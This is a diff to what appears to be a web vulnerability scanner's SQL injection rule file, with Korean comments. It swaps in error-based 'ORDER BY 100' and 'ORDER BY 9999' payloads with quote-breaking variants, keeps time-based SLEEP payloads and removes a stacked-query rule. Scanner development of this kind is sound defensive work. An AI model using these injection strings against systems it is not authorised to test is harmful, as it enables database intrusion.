@@ -99,12 +99,18 @@ SQLI_RULES: list[dict] = [
         "vuln_type": "sqli",
         "technique": "order_by",
         "sequence": ["baseline", "attack"],
+        # ORDER BY 절 주입 → 컬럼 수보다 큰 번호로 정렬 시 DB가
+        # "Unknown column '100' in 'order clause'" 에러를 확정적으로 노출.
+        # (ORDER BY 1 처럼 유효한 번호는 에러 없이 정렬만 되므로 반드시 큰 수)
+        # 판정은 analyzer 의 judge_error_based_sqli(DB 에러 시그니처)로 낙하.
         "payload_templates": {
             "attack": [
-                "{value} ASC -- ",
-                "{value} DESC -- ",
-                "{value} 1 ASC -- ",
-                "{value} 1 DESC -- ",
+                "{value} ORDER BY 100-- ",
+                "{value}' ORDER BY 100-- ",
+                '{value}" ORDER BY 100-- ',
+                "{value} ORDER BY 9999-- ",
+                "{value}' ORDER BY 9999-- ",
+                '{value}" ORDER BY 9999-- ',
             ],
         },
     },
@@ -127,19 +133,6 @@ SQLI_RULES: list[dict] = [
                 f"{{value}} OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                 f"{{value}}' OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                 f'{{value}}" OR 0 IN (SELECT sleep({_SLEEP}) ) -- ',
-            ],
-        },
-    },
-    {
-        "attack_id": "PL-SQLI-STACKED",
-        "vuln_type": "sqli",
-        "technique": "stacked",
-        "sequence": ["baseline", "attack"],
-        "payload_templates": {
-            "attack": [
-                f"{{value}}; SELECT SLEEP({_SLEEP})-- ",
-                f"{{value}}'; SELECT SLEEP({_SLEEP})-- ",
-                f'{{value}}"; SELECT SLEEP({_SLEEP})-- ',
             ],
         },
     },
